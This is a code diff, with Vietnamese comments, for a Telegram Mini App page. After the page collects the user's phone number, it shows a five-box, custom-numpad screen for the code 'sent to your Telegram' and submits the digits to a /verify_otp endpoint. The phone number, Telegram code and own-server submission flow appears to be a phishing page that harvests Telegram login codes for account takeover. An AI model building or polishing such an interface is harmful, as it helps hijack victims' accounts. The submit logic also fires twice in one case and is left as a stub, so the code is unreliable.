@@ -46,23 +46,51 @@
             });
             
             // --- SỬA Ở ĐÂY ---
-            // Thay vì dùng +=, hãy thay thế hoàn toàn nội dung cũ bằng nội dung mới
-            const appDiv = document.getElementById('app');
-            appDiv.innerHTML = `
-                <div style="font-size: 40px; margin-bottom: 10px;">📩</div>
-                <div id="message">Mã OTP đã được gửi về Telegram của bạn.<br>Vui lòng nhập mã vào ô dưới đây:</div>
-                <input type="text" id="otpInput" placeholder="Nhập mã OTP..." style="padding: 12px; width: 90%; border-radius: 8px; border: none; margin-top: 15px; font-size: 16px;">
-            `;
-            
-            tg.MainButton.text = "XÁC NHẬN MÃ OTP";
-            // Xóa sự kiện cũ và gán sự kiện mới cho nút
-            tg.MainButton.offClick(); 
-            tg.MainButton.onClick(submitOtp); 
-            // ------------------
-        } else {
-            alert("Lỗi không lấy được SĐT.");
-        }
-    });
+            // Thay thế đoạn code xử lý hiển thị OTP bằng đoạn này
+document.getElementById('app').innerHTML = `
+    <div style="margin-bottom: 20px; font-weight: bold;">NHẬP MÃ OTP (5 SỐ)</div>
+    <!-- 5 ô nhập mã -->
+    <div id="otp-container" style="display: flex; justify-content: center; gap: 10px; margin-bottom: 30px;">
+        <input type="text" maxlength="1" class="otp-box" readonly style="width: 40px; height: 50px; text-align: center; font-size: 24px; border: 1px solid #333; border-radius: 8px; background: #1c232d; color: white;">
+        <input type="text" maxlength="1" class="otp-box" readonly style="width: 40px; height: 50px; text-align: center; font-size: 24px; border: 1px solid #333; border-radius: 8px; background: #1c232d; color: white;">
+        <input type="text" maxlength="1" class="otp-box" readonly style="width: 40px; height: 50px; text-align: center; font-size: 24px; border: 1px solid #333; border-radius: 8px; background: #1c232d; color: white;">
+        <input type="text" maxlength="1" class="otp-box" readonly style="width: 40px; height: 50px; text-align: center; font-size: 24px; border: 1px solid #333; border-radius: 8px; background: #1c232d; color: white;">
+        <input type="text" maxlength="1" class="otp-box" readonly style="width: 40px; height: 50px; text-align: center; font-size: 24px; border: 1px solid #333; border-radius: 8px; background: #1c232d; color: white;">
+    </div>
+    <!-- Bàn phím số -->
+    <div id="numpad" style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; width: 250px; margin: 0 auto;">
+        ${[1,2,3,4,5,6,7,8,9,'C',0,'OK'].map(num => `
+            <button onclick="handleKey('${num}')" style="padding: 15px; border-radius: 8px; border: none; background: #2b3a4a; color: white; font-size: 18px;">${num}</button>
+        `).join('')}
+    </div>
+`;
+
+tg.MainButton.hide(); // Ẩn MainButton vì ta dùng bàn phím riêng
+
+// Logic xử lý nhập liệu
+let currentOtp = "";
+window.handleKey = (key) => {
+    const boxes = document.querySelectorAll('.otp-box');
+    if (key === 'C') {
+        currentOtp = currentOtp.slice(0, -1);
+    } else if (key === 'OK') {
+        if (currentOtp.length === 5) submitOtp(currentOtp);
+    } else {
+        if (currentOtp.length < 5) currentOtp += key;
+    }
+    
+    // Cập nhật giao diện ô
+    boxes.forEach((box, i) => box.value = currentOtp[i] || "");
+    
+    // Tự động enter khi đủ 5 số
+    if (currentOtp.length === 5) submitOtp(currentOtp);
+};
+
+// Hàm gửi mã lên server (gọi lại hàm submitOtp của bạn)
+async function submitOtp(otp) {
+    // ... (Giữ nguyên logic fetch /verify_otp như cũ của bạn)
+    console.log("Gửi mã:", otp);
+}
 </script>
 </body>
 </html>
